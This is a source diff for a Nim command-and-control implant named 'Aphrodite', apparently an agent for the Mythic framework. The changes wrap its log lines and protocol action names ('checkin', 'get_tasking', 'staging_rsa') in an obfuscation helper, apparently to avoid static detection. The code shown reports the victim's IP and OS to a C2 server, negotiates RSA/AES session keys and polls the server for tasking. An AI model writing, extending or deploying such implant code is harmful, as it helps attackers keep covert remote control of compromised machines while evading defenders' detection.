@@ -1,5 +1,5 @@
 import std/[json, os, strutils, times, random, base64]
-import config, crypto/aes, core/utils, core/types
+import config, crypto/aes, crypto/strenc, core/utils, core/types
 import core/jobs, proxy/socks_mgr
 
 when defined(c2ProfileWs):
@@ -140,14 +140,14 @@ proc makeSendMsg(ag: AphroditeAgent): SendMsg =
 proc setupPsk(ag: AphroditeAgent): bool =
   if AesPsk.len == 0:
     ag.aesKey = @[]
-    stderr.writeLine("[*] No PSK configured — plaintext mode")
+    stderr.writeLine(hidstr("[*] No PSK configured — plaintext mode"))
     return true
   ag.aesKey = base64Key(AesPsk)
   if ag.aesKey.len != 32:
-    stderr.writeLine("[!] Invalid PSK length — falling back to plaintext")
+    stderr.writeLine(hidstr("[!] Invalid PSK length — falling back to plaintext"))
     ag.aesKey = @[]
   else:
-    stderr.writeLine("[*] PSK loaded (" & $ag.aesKey.len & " bytes)")
+    stderr.writeLine(hidstr("[*] PSK loaded (") & $ag.aesKey.len & hidstr(" bytes)"))
   return true
 
 # ---------------------------------------------------------------------------
@@ -168,16 +168,16 @@ when defined(useEke):
     let sessionId = ekaSessionId()
     let pubB64    = ctx.ekaPublicKeyB64()
 
-    let jsonBody = """{"action":"staging_rsa","pub_key":"""" & pubB64 &
-                   """","session_id":"""" & sessionId & """"}"""
+    let jsonBody = "{\"action\":\"" & hidstr("staging_rsa") & "\",\"pub_key\":\"" & pubB64 &
+                   "\",\"session_id\":\"" & sessionId & "\"}"
 
-    stderr.writeLine("[*] EKE: sending staging_rsa (RSA-2048)")
+    stderr.writeLine(hidstr("[*] EKE: sending staging_rsa (RSA-2048)"))
 
     ## Send encrypted with PSK (ag.aesKey set by setupPsk — empty = plaintext)
     let raw = ag.transport.post(ag.payloadUUID, ag.aesKey, jsonBody)
     if raw.len == 0:
       ctx.ekaFree()
-      stderr.writeLine("[!] EKE: no response from server")
+      stderr.writeLine(hidstr("[!] EKE: no response from server"))
       return false
 
     var resp: JsonNode
@@ -185,7 +185,7 @@ when defined(useEke):
       resp = parseJson(raw)
     except:
       ctx.ekaFree()
-      stderr.writeLine("[!] EKE: invalid JSON response")
+      stderr.writeLine(hidstr("[!] EKE: invalid JSON response"))
       return false
 
     let newUUID = resp{"uuid"}.getStr("")
@@ -194,11 +194,11 @@ when defined(useEke):
 
     if newUUID.len == 0 or encKey.len == 0:
       ctx.ekaFree()
-      stderr.writeLine("[!] EKE: missing uuid or session_key in response")
+      stderr.writeLine(hidstr("[!] EKE: missing uuid or session_key in response"))
       return false
     if respSid != sessionId:
       ctx.ekaFree()
-      stderr.writeLine("[!] EKE: session_id mismatch")
+      stderr.writeLine(hidstr("[!] EKE: session_id mismatch"))
       return false
 
     ## Decrypt AES session key with our RSA private key (PKCS#1 v1.5)
@@ -206,12 +206,12 @@ when defined(useEke):
     ctx.ekaFree()
 
     if aesKey.len != 32:
-      stderr.writeLine("[!] EKE: decrypted key length wrong (" & $aesKey.len & " bytes, expected 32)")
+      stderr.writeLine(hidstr("[!] EKE: decrypted key length wrong (") & $aesKey.len & hidstr(" bytes, expected 32)"))
       return false
 
     ag.mythicID = newUUID
     ag.aesKey   = aesKey
-    stderr.writeLine("[+] EKE staging complete — staging UUID=" & newUUID)
+    stderr.writeLine(hidstr("[+] EKE staging complete — staging UUID=") & newUUID)
     return true
 
 # ---------------------------------------------------------------------------
@@ -229,7 +229,7 @@ proc checkin(ag: AphroditeAgent): bool =
       return false
 
   let msg = %*{
-    "action":          "checkin",
+    "action":          hidstr("checkin"),
     "uuid":            ag.payloadUUID,
     "ips":             [getLocalIP()],
     "os":              getOS(),
@@ -247,7 +247,7 @@ proc checkin(ag: AphroditeAgent): bool =
   let resp = ag.sendMessage(msg)
   if resp.kind == JNull:
     return false
-  if resp{"status"}.getStr("") != "success":
+  if resp{"status"}.getStr("") != hidstr("success"):
     debugLog("Checkin failed: " & $resp)
     return false
 
@@ -419,11 +419,11 @@ proc collectSocksOut(): seq[JsonNode] =
 # ---------------------------------------------------------------------------
 
 proc run*(ag: AphroditeAgent) =
-  stderr.writeLine("[*] Aphrodite starting — UUID=" & ag.payloadUUID)
+  stderr.writeLine(hidstr("[*] Aphrodite starting — UUID=") & ag.payloadUUID)
   when defined(c2ProfileWs):
-    stderr.writeLine("[*] C2 (WS): ws://" & WsHost & ":" & $WsPort & "/" & WsPath)
+    stderr.writeLine(hidstr("[*] C2 (WS): ws://") & WsHost & ":" & $WsPort & "/" & WsPath)
   else:
-    stderr.writeLine("[*] C2 (HTTP): " & C2BaseUrl & C2Endpoint)
+    stderr.writeLine(hidstr("[*] C2 (HTTP): ") & C2BaseUrl & C2Endpoint)
 
   var retries = 0
   while ag.state.running and retries < 10:
@@ -434,10 +434,10 @@ proc run*(ag: AphroditeAgent) =
     sleep(delay * 1000)
 
   if not ag.state.running or ag.mythicID.len == 0:
-    stderr.writeLine("[!] Failed to check in after retries. Exiting.")
+    stderr.writeLine(hidstr("[!] Failed to check in after retries. Exiting."))
     return
 
-  stderr.writeLine("[+] Checkin OK — callback ID=" & ag.mythicID)
+  stderr.writeLine(hidstr("[+] Checkin OK — callback ID=") & ag.mythicID)
 
   var pendingResponses: seq[JsonNode] = @[]
   var pendingSocks:     seq[JsonNode] = @[]
@@ -448,7 +448,7 @@ proc run*(ag: AphroditeAgent) =
 
     ## --- Build get_tasking message ---
     var pollMsg = %*{
-      "action":       "get_tasking",
+      "action":       hidstr("get_tasking"),
       "tasking_size": -1,
     }
     if pendingResponses.len > 0:
